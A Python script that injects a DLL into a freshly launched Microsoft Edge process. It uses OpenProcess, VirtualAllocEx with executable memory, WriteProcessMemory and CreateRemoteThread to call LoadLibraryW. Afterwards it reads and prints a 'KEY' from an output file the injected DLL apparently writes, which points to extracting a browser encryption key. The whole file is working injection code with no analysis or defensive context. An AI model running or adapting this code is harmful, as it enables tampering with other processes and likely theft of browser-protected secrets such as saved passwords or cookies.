import ctypes, ctypes.wintypes as wt, time, os, sys, subprocess

psapi = ctypes.windll.psapi
psapi.GetModuleFileNameExW.argtypes = [wt.HANDLE, ctypes.c_void_p, wt.LPWSTR, wt.DWORD]
psapi.EnumProcessModulesEx.argtypes = [wt.HANDLE, ctypes.c_void_p, wt.DWORD, ctypes.POINTER(wt.DWORD), wt.DWORD]
k32 = ctypes.windll.kernel32
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wt.DWORD, wt.DWORD]
k32.WriteProcessMemory.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.CreateRemoteThread.restype = wt.HANDLE
k32.CreateRemoteThread.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, wt.DWORD, ctypes.POINTER(wt.DWORD)]
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [wt.HANDLE, ctypes.c_char_p]
k32.GetModuleHandleW.restype = wt.HMODULE
k32.GetModuleHandleW.argtypes = [wt.LPCWSTR]
k32.OpenProcess.restype = wt.HANDLE
k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]

def w(x): open(r"C:\Tools\inj_log.txt","a").write(str(x)+"\n")

EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ARGS = "--user-data-dir=C:\\Tools\\edgehost --no-first-run --no-default-browser-check"
DLL = r"C:\Tools\edgedll.dll"

w("=== FULL-PATH edge injection ===")
p = subprocess.Popen([EDGE, ARGS])
time.sleep(4)
pid = p.pid
w("pid=%d" % pid)

h = k32.OpenProcess(0x1F0FFF, False, pid)
if not h:
    w("OpenProcess failed gle=%d" % k32.GetLastError()); sys.exit(1)

LIST_MODULES_ALL = 0x03
needed = wt.DWORD()
psapi.EnumProcessModulesEx(h, None, 0, ctypes.byref(needed), LIST_MODULES_ALL)
count = needed.value // ctypes.sizeof(wt.HMODULE)
mods = (wt.HMODULE * count)()
remote_k32 = None
if psapi.EnumProcessModulesEx(h, mods, ctypes.sizeof(mods), ctypes.byref(needed), LIST_MODULES_ALL):
    real = needed.value // ctypes.sizeof(wt.HMODULE)
    for i in range(real):
        n = ctypes.create_unicode_buffer(512)
        psapi.GetModuleFileNameExW(h, mods[i], n, 512)
        if "kernel32" in n.value.lower():
            remote_k32 = ctypes.cast(mods[i], ctypes.c_void_p).value
            w("remote k32=0x%X" % remote_k32)
if not remote_k32:
    w("no remote kernel32"); sys.exit(1)

local_k32 = ctypes.cast(k32.GetModuleHandleW("kernel32.dll"), ctypes.c_void_p).value
remote_loadlib = remote_k32 + (k32.GetProcAddress(k32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW") - local_k32)

dll_path = ctypes.create_unicode_buffer(DLL)
alloc = k32.VirtualAllocEx(h, None, ctypes.sizeof(dll_path), 0x3000, 0x40)
wrote = ctypes.c_size_t()
k32.WriteProcessMemory(h, alloc, dll_path, ctypes.sizeof(dll_path), ctypes.byref(wrote))
w("mem=0x%X wrote=%d" % (alloc, wrote.value))

tid = wt.DWORD()
hthread = k32.CreateRemoteThread(h, None, 0, remote_loadlib, alloc, 0, ctypes.byref(tid))
if not hthread:
    w("CRT failed gle=%d" % k32.GetLastError()); sys.exit(1)
k32.WaitForSingleObject(hthread, 20000)
ec = wt.DWORD()
k32.GetExitCodeThread(hthread, ctypes.byref(ec))
w("exit=0x%X" % ec.value)
time.sleep(3)
try:
    print("KEY: " + open(r"C:\Tools\key_out.txt").read())
except Exception:
    print("no key")
p.kill()